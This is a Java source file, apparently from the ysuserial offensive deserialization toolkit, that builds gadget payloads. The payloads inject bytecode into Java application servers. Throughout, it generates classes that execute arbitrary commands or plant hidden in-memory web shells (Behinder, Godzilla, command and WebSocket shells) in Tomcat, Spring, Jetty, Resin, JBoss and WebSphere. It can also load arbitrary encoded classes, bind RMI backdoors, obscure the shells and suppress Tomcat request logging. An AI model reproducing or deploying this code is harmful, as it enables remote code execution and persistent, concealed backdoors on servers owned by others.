package org.su18.ysuserial.payloads.util;


import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
import static org.su18.ysuserial.Strings.converString;
import static org.su18.ysuserial.payloads.config.Config.*;
import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
import static org.su18.ysuserial.payloads.util.Utils.base64Decode;
import static org.su18.ysuserial.payloads.util.Utils.writeClassToFile;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.*;
import java.util.*;
import java.util.zip.GZIPOutputStream;

import javassist.*;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.commons.lang.StringUtils;


@SuppressWarnings({
		"restriction", "rawtypes", "unchecked"
})
public class Gadgets {

	public static String memShellClassname = "";

	public static byte[] memShellClassBytes = null;

	static {
		// special case for using TemplatesImpl gadgets with a SecurityManager enabled
		System.setProperty(DESERIALIZE_TRANSLET, "true");

		// for RMI remote loading
		System.setProperty("java.rmi.server.useCodebaseOnly", "false");
	}

	public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

	public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
		return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
	}


	public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
		return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
	}


	public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
		final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
		allIfaces[0] = iface;
		if (ifaces.length > 0) {
			System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
		}
		return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
	}


	public static Map<String, Object> createMap(final String key, final Object val) {
		final Map<String, Object> map = new HashMap<String, Object>();
		map.put(key, val);
		return map;
	}


	public static Object createTemplatesImpl(String command) throws Exception {
		command = command.trim();

		String   packageName = "org.su18.ysuserial.payloads.templates.";
		Class<?> clazz;
		Class    tplClass;
		Class    abstTranslet;
		Class    transFactory;

		// 兼容不同 JDK 版本
		if (Boolean.parseBoolean(System.getProperty("properXalan", "false")) || FORCE_USING_ORG_APACHE_TEMPLATESIMPL) {
			tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
			abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
			transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
		} else {
			tplClass = TemplatesImpl.class;
			abstTranslet = AbstractTranslet.class;
			transFactory = TransformerFactoryImpl.class;
		}

		// 支持单双引号
		if (command.startsWith("'") || command.startsWith("\"")) {
			command = command.substring(1, command.length() - 1);
		}


		// 如果命令以 EX- 开头（Extra 特殊功能），根据想使用的不同类获取不同的 class 模板进行加载获取不同的功能
		if (command.startsWith("EX-")) {
			command = command.substring(3);
			String type = "";
			String name = "";

			// 如果命令以 MS 开头，则代表是注入内存马
			if (command.startsWith("MS-")) {
				command = command.substring(3);
				packageName += "memshell.";
				String prefix = command.substring(0, 2).toLowerCase();

				if ("tf".equals(prefix) || "tl".equals(prefix) || "ts".equals(prefix) || "tw".equals(prefix) ||
						"te".equals(prefix) || "tu".equals(prefix)) {
					packageName += "tomcat.";
				} else if ("sp".equals(prefix)) {
					packageName += "spring.";
				} else if ("jf".equals(prefix) || "js".equals(prefix)) {
					packageName += "jetty.";
				} else if ("rf".equals(prefix) || "rs".equals(prefix)) {
					packageName += "resin.";
				} else if ("jb".equals(prefix)) {
					packageName += "jboss.";
				} else if ("ws".equals(prefix)) {
					packageName += "websphere.";
				}

				if (command.contains("-")) {
					String[] commands = command.split("[-]");
					name = commands[0];
					type = command.substring(command.indexOf("-") + 1);
				} else {
					name = command;
				}

				clazz = Class.forName(packageName + name, false, Gadgets.class.getClassLoader());
			} else {

				if (command.endsWith("Echo")) {
					packageName += "echo.";
				}

				// 这里不能让它初始化，不然从线程中获取 WebappClassLoaderBase 时会强制类型转换异常。
				clazz = Class.forName(packageName + command, false, Gadgets.class.getClassLoader());
			}

			return createTemplatesImpl(clazz, null, null, type, tplClass, abstTranslet, transFactory);
			// 如果命令以 LF- 开头 （Local File），则程序可以生成一个能加载本地指定类字节码并初始化的逻辑，后面跟文件路径-类名
		} else if (command.startsWith("LF-")) {
			command = command.substring(3);
			// base64 decode and
			byte[] bs        = base64Decode(command.split("[-]")[0]).getBytes();
			String className = command.split("[-]")[1];
			return createTemplatesImpl(null, null, bs, className, tplClass, abstTranslet, transFactory);
		} else {
			// 否则就是普通的命令执行
			return createTemplatesImpl(null, command, null, null, tplClass, abstTranslet, transFactory);
		}
	}


	public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, String cName, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
		final T   templates    = tplClass.newInstance();
		byte[]    classBytes   = new byte[0];
		ClassPool pool         = ClassPool.getDefault();
		String    newClassName = generateClassName();

		pool.insertClassPath(new ClassClassPath(abstTranslet));
		CtClass superClass = pool.get(abstTranslet.getName());

		CtClass ctClass = null;

		// 如果 Command 不为空，则是普通的命令执行
		if (command != null) {
			ctClass = pool.makeClass(newClassName);
			insertCMD(ctClass);
			CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
			ctConstructor.setBody("{execCmd(\"" + command + "\");}");
			ctClass.addConstructor(ctConstructor);

			// 最短化
//			ctClass = pool.makeClass(newClassName);
//			CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
//			ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
//			ctClass.addConstructor(ctConstructor);

			// 如果全局配置继承，再设置父类
			if (IS_INHERIT_ABSTRACT_TRANSLET) {
				ctClass.setSuperclass(superClass);
			}

			classBytes = ctClass.toBytecode();
		}

		// 如果 myClass 不为空，则说明指定了一些 Class 执行特殊功能
		if (myClass != null) {
			String className = myClass.getName();
			ctClass = pool.get(className);

			// 从 Request 中获取的内存马逻辑需要 Header 判断
			if (className.contains("TLNeoRegFromThread")) {
				insertField(ctClass, "HEADER_KEY", "public static String HEADER_KEY=\"" + HEADER_KEY + "\";");
				insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=\"" + HEADER_VALUE + "\";");
			}

			// 为 DefineClassFromParameter 添加自定义函数功能
			if (className.endsWith("DefineClassFromParameter")) {
				insertField(ctClass, "parameter", "public static String parameter = \"" + PARAMETER + "\";");
			} else if (className.endsWith("Echo")) {
				insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = \"" + CMD_HEADER_STRING + "\";");
				// 动态为 Echo回显类 添加执行命令功能
				insertCMD(ctClass);
				ctClass.getDeclaredMethod("q").setBody("{return execCmd($1);}");

			} else if (className.contains("RMIBindTemplate")) {
				// 如果是 RMI 内存马，则修改其中的 registryPort、bindPort、serviceName，插入关键方法

				if (IS_INHERIT_ABSTRACT_TRANSLET) {
					ctClass.setSuperclass(superClass);
				}

				String[] parts = cName.split("-");

				if (parts.length < 3) {
					// BindPort 写 0 就是随机端口
					throw new IllegalArgumentException("Command format is: EX-MS-RMIBindTemplate-<RegistryPort>-<BindPort>-<ServiceName>");
				}

				// 插入关键参数
				String rPortString = "port=" + parts[0] + ";";
				ctClass.makeClassInitializer().insertBefore(rPortString);
				String bPort = "bindPort=" + parts[1] + ";";
				ctClass.makeClassInitializer().insertBefore(bPort);
				String sName = "serviceName=\"" + parts[2] + "\";";
				ctClass.makeClassInitializer().insertBefore(sName);

				ctClass.setInterfaces(new CtClass[]{pool.get("javax.management.remote.rmi.RMIConnection"), pool.get("java.io.Serializable")});

				// 插入目标执行类
				insertCMD(ctClass);
				ctClass.addMethod(CtMethod.make("public String getDefaultDomain(javax.security.auth.Subject subject) throws java.io.IOException {return new String(execCmd(((java.security.Principal)subject.getPrincipals().iterator().next()).getName()).toByteArray());}", ctClass));

			} else {
				if (className.contains("WSMS")) {
					insertKeyMethod(ctClass, "ws");
				} else if (className.contains("UGMS")) {
					insertKeyMethod(ctClass, "upgrade");
				} else if (className.contains("EXMS")) {
					insertKeyMethod(ctClass, "execute");
				} else if (StringUtils.isNotEmpty(cName)) {
					insertKeyMethod(ctClass, cName);
				}
			}

			ctClass.setName(newClassName);

			// 如果指定继承 AbstractTranslet，统一由 ClassLoaderTemplate 加载
			// 不搞那么麻烦写 if else 了，有长度需求自己再改吧
			if (IS_INHERIT_ABSTRACT_TRANSLET) {
				bytes = ctClass.toBytecode();
				cName = ctClass.getName();
			}

			classBytes = ctClass.toBytecode();
		}

		// 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
		if (bytes != null) {
			ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
			ctClass.setName(generateClassName());
			ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
			GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
			gzipOutputStream.write(bytes);
			gzipOutputStream.close();
			String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
			String className = "className=\"" + cName + "\";";
			ctClass.makeClassInitializer().insertBefore(content);
			ctClass.makeClassInitializer().insertBefore(className);

			if (IS_INHERIT_ABSTRACT_TRANSLET) {
				ctClass.setSuperclass(superClass);
			}

			classBytes = ctClass.toBytecode();
		}

		if (HIDE_MEMORY_SHELL) {
			switch (HIDE_MEMORY_SHELL_TYPE) {
				case 1:
					break;
				case 2:
					CtClass newClass = pool.get("org.su18.ysuserial.payloads.templates.HideMemShellTemplate");
					newClass.setName(generateClassName());
					String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
					String className = "className=\"" + ctClass.getName() + "\";";
					newClass.defrost();
					newClass.makeClassInitializer().insertBefore(content);
					newClass.makeClassInitializer().insertBefore(className);

					if (IS_INHERIT_ABSTRACT_TRANSLET) {
						newClass.setSuperclass(superClass);
					}

					classBytes = newClass.toBytecode();
					break;
			}
		}

		// 保存内存马文件
		if (GEN_MEM_SHELL) {
			if (StringUtils.isNotEmpty(GEN_MEM_SHELL_FILENAME)) {
				writeClassToFile(GEN_MEM_SHELL_FILENAME, classBytes);
			} else {
				writeClassToFile(ctClass.getName() + ".class", classBytes);
			}
		}

		// 加载 class 试试
//		loadClassTest(classBytes, ctClass.getName());

		// 写入前将 classBytes 中的类标识设为 JDK 1.6 的版本号
		classBytes[7] = 49;

		// 储存一下生成的内存马类名及类字节码，用来给 TransformerUtil 用
		memShellClassBytes = ctClass.toBytecode();
		memShellClassname = ctClass.getName();

		// 恶意类是否继承 AbstractTranslet
		if (IS_INHERIT_ABSTRACT_TRANSLET) {
			// inject class bytes into instance
			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
		} else {
			CtClass newClass = pool.makeClass(generateClassName());
			insertField(newClass, "serialVersionUID", "private static final long serialVersionUID = 8207363842866235160L;");

			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, newClass.toBytecode()});
			// 当 _transletIndex >= 0 且 classCount 也就是生成类的数量大于 1 时，不需要继承 AbstractTranslet
			Reflections.setFieldValue(templates, "_transletIndex", 0);
		}

		// required to make TemplatesImpl happy
		Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
		Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
		return templates;
	}


	public static HashMap makeMap(Object v1, Object v2) throws Exception {
		HashMap s = new HashMap();
		Reflections.setFieldValue(s, "size", 2);
		Class nodeC;
		try {
			nodeC = Class.forName("java.util.HashMap$Node");
		} catch (ClassNotFoundException e) {
			nodeC = Class.forName("java.util.HashMap$Entry");
		}
		Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
		Reflections.setAccessible(nodeCons);

		Object tbl = Array.newInstance(nodeC, 2);
		Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
		Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
		Reflections.setFieldValue(s, "table", tbl);
		return s;
	}

	public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {

		// 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
		String name = ctClass.getName();
		name = name.substring(name.lastIndexOf(".") + 1);

		// 大多数 SpringBoot 项目使用内置 Tomcat
		boolean isTomcat  = name.startsWith("T") || name.startsWith("Spring");
		boolean isWebflux = name.contains("Webflux");

		// 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
		String method = name.contains("SpringControllerMS") ? "drop" : "";

		List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
		classes.add(ctClass.getSuperclass());

		for (CtClass value : classes) {
			String className = value.getName();
			if (KEY_METHOD_MAP.containsKey(className)) {
				method = KEY_METHOD_MAP.get(className);
				break;
			}
		}

		// 命令执行、各种内存马
		insertField(ctClass, "HEADER_KEY", "public static String HEADER_KEY=" + converString(HEADER_KEY) + ";");
		insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=" + converString(HEADER_VALUE) + ";");

		if ("bx".equals(type)) {
			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));

			try {
				ctClass.getDeclaredMethod("getFieldValue");
			} catch (NotFoundException e) {
				ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
			}

			ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));

			String shell = "";
			if (isTomcat) {
				insertTomcatNoLog(ctClass);
				shell = IS_OBSCURE ? BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : BEHINDER_SHELL_FOR_TOMCAT;
			} else {
				shell = IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
			}

			insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD));
		} else if ("gz".equals(type)) {
			insertField(ctClass, "payload", "Class payload ;");
			insertField(ctClass, "xc", "String xc = " + converString(GODZILLA_KEY) + ";");
			insertField(ctClass, "PASS", "String PASS = " + converString(PASSWORD_ORI) + ";");

			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
			ctClass.addMethod(CtMethod.make(base64Decode(MD5), ctClass));
			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
			insertTomcatNoLog(ctClass);
			if (isWebflux) {
				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL_FOR_WEBFLUX));
			} else {
				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL));
			}
		} else if ("gzraw".equals(type)) {
			insertField(ctClass, "payload", "Class payload ;");
			insertField(ctClass, "xc", "String xc = " + converString(GODZILLA_KEY) + ";");

			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
			insertTomcatNoLog(ctClass);
			insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL));
		} else if ("execute".equals(type)) {
			insertField(ctClass, "TAG", "public static String TAG = \"" + CMD_HEADER_STRING + "\";");
			insertCMD(ctClass);
			ctClass.addMethod(CtMethod.make(base64Decode(GET_REQUEST), ctClass));
			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
			ctClass.addMethod(CtMethod.make(base64Decode(GET_RESPONSE), ctClass));

			insertMethod(ctClass, method, base64Decode(EXECUTOR_SHELL));
		} else if ("ws".equals(type)) {
			insertCMD(ctClass);
			insertMethod(ctClass, method, base64Decode(WS_SHELL));
		} else if ("upgrade".equals(type)) {
			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");

			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
			insertCMD(ctClass);
			insertMethod(ctClass, method, base64Decode(UPGRADE_SHELL));
		} else {
			insertCMD(ctClass);
			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");

			if (isWebflux) {
				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_WEBFLUX));
			} else if (isTomcat) {
				insertTomcatNoLog(ctClass);
				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT));
			} else {
				insertMethod(ctClass, method, base64Decode(CMD_SHELL));
			}
		}

		ctClass.setName(generateClassName());
		insertField(ctClass, "pattern", "public static String pattern = " + converString(URL_PATTERN) + ";");

	}

	public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
		// 根据传入的不同参数，在不同方法中插入不同的逻辑
		CtMethod cm = ctClass.getDeclaredMethod(method);
		cm.insertBefore(payload);
	}

	/**
	 * 向指定类中写入命令执行方法 execCmd
	 * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
	 *
	 * @param ctClass 指定类
	 * @throws Exception 抛出异常
	 */
	public static void insertCMD(CtClass ctClass) throws Exception {

		if (IS_OBSCURE) {
			ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
			ctClass.addMethod(CtMethod.make(base64Decode(TO_CSTRING_Method), ctClass));
			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
			try {
				ctClass.getDeclaredMethod("getFieldValue");
			} catch (NotFoundException e) {
				ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
			}
			ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD_OBSCURE), ctClass));
		} else {
			ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD), ctClass));
		}
	}

	public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
		ctClass.defrost();
		try {
			CtField ctSUID = ctClass.getDeclaredField(fieldName);
			ctClass.removeField(ctSUID);
		} catch (javassist.NotFoundException ignored) {
		}
		ctClass.addField(CtField.make(fieldCode, ctClass));
	}

	public static void insertTomcatNoLog(CtClass ctClass) throws Exception {

		try {
			ctClass.getDeclaredMethod("getFieldValue");
		} catch (NotFoundException e) {
			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
		}

		try {
			ctClass.getDeclaredMethod("getMethodByClass");
		} catch (NotFoundException e) {
			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
		}

		try {
			ctClass.getDeclaredMethod("getMethodAndInvoke");
		} catch (NotFoundException e) {
			if (IS_OBSCURE) {
				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
			} else {
				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
			}
		}

		ctClass.addMethod(CtMethod.make(base64Decode(TOMCAT_NO_LOG), ctClass));
	}
}
